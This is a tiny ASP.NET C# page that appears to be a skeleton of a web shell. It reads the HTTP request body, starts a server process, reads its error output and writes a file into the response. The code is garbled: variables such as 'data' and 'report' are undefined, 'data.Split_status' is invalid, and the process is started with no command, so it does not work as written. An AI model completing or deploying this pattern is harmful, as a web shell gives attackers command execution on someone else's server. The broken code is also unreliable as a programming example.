<%@ Page Language="C#" %>
<% var stream = Request.InputStream;
var fields = data.Split("_");
var status = data.Split_status;
var process = new Process();
process.Start();
var contents = process.StandardError.ReadToEnd();
HttpContext.Current.Response.WriteFile(report);
%>
